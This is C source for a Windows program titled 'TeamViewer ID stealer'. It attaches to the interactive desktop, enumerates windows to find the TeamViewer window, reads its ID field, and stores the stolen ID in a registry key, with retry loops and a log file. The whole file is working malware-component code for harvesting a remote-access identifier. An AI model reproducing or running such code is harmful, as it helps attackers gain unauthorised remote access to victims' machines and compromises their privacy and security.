/* TEAM VIEWER ID STEALER
 *
 * Try to steal TeamViewer id in registry key, running instances and log files
 *
 */
#include "tvidstealer.h"
#include "registry.h"

struct tvWindowParam{
    HANDLE hWindow;
    char sid[TV_WINDOW_NAME_LEN];
    BOOL found;
};

struct tvIdParam {
    int count;          /* ID field index (eg: in TeamViewer QuickSupport the ID is the 2nd one) */
    char sid[TV_ID_LEN];  /* ID string */
    int id;               /* ID DWORD */
    BOOL found;         /* Status */
};

/* Check if id is a valid TeamViewer ID */
BOOL
is_tvId(char *sid, int *id){
    int id1,id2,id3;
    if(3==sscanf(sid,"%d %d %d",&id1,&id2,&id3)){
        printf("[+] TeamViewer ID: %d %d %d\n",id1,id2,id3);
        *id = id1*1000000 + id2*1000 + id3;
        return TRUE;
    }
    return FALSE;
}

/* Look for TeamViewer Id in the specified window field (hwnd) */
BOOL CALLBACK
find_tvId (HWND hwnd, LPARAM lParam){
    BOOL ret=TRUE;
    struct tvIdParam *p=(struct tvIdParam *)lParam;
    p->count++;

    SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_ID_LEN, (LPARAM) p->sid);

    if(is_tvId(p->sid, &p->id)){
        p->found=TRUE;
        ret=FALSE;
    }
    return ret;
}

BOOL CALLBACK
find_tvWindow (HWND hwnd, LPARAM lParam){
    BOOL ret=TRUE;

    struct tvWindowParam *p=(struct tvWindowParam *)lParam;

    SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_WINDOW_NAME_LEN, (LPARAM) p->sid);

    if(!strncmp(TV_WINDOW_NAME,p->sid,TV_WINDOW_NAME_LEN)){
        p->found=TRUE;
        p->hWindow=hwnd;
        ret=FALSE;
    }
    return ret;
}

int
main(int argc, char *argv[]){
    struct tvIdParam idp;
    struct tvWindowParam wip;
    int tries=0;
    HDESK hDesk=NULL;
    HWINSTA hWinsta=NULL;
    FILE *log=NULL;
    char logfile[128];
    int error=0;

    snprintf(logfile,128,"%s.log.txt",argv[0]);

    log = fopen(logfile,"a+");
    if(!log){
        /* not realy an error ... */
        log=log;
    }

    if(check_registry_key()){
        goto abort;
    }

    /* Switch to the needed Desktop Station (in order to enumwindows */
    hWinsta=OpenWindowStation("winsta0", // _In_  LPTSTR lpszWinSta,
                      TRUE, //  _In_  BOOL fInherit,
                      WINSTA_ALL_ACCESS); // _In_  ACCESS_MASK dwDesiredAccess
    if(!hWinsta){
        fprintf(log,"[-] OpenWindowStation: %ld, error\n",GetLastError());
        error++;
        goto abort;
    }
    else{
        fprintf(log,"[+] OpenWindowStation: ok\n");
    }
    if( ! SetProcessWindowStation(hWinsta)){
         fprintf(log,"[-] SetProcessWindowStation: %ld, error\n",GetLastError());
         error++;
         goto abort;
    }else{
        fprintf(log,"[+] SetProcessWindowStation: ok\n");
    }

    /* Open the default Desktop */
    hDesk=OpenInputDesktop(0,FALSE,GENERIC_READ);
    if(!hDesk){
        fprintf(log,"[-] OpenInputDesktop: %ld, error\n",GetLastError());
        error++;
        goto abort;
    }
    else{
        fprintf(log,"[+] OpenInputDesktop: ok\n");
    }

    while(tries < TIMEOUT || TIMEOUT==0){

        wip.found=FALSE;
        wip.hWindow=NULL;
        *wip.sid=0;

        if( ! EnumDesktopWindows(hDesk,find_tvWindow,(LPARAM)&wip)){
            error++;
            fprintf(log,"[-] EnumDesktopWindows: %ld, error\n",GetLastError());
        }
        else{
            fprintf(log,"[+] EnumDesktopWindows: ok\n");
        }

        if(wip.found){
            fprintf(log,"[+] TeamViewer found\n");

            /* Reset param struct */
            idp.count=0;
            *idp.sid=0;
            idp.id=0;
            idp.found=FALSE;

            EnumChildWindows(wip.hWindow,find_tvId,(LPARAM)&idp);

            if(idp.found){
                add_registry_key(idp.id);
                break;
            }
        }
        else {
            fprintf(log,"[!] TeamViewer not found\n");
        }
        Sleep(SLEEP);
        tries++;
    }
abort:
    if(hDesk)
        CloseDesktop(hDesk);
    if(hWinsta)
        CloseWindowStation(hWinsta);
    if(log)
        fclose(log);
    return error;
}
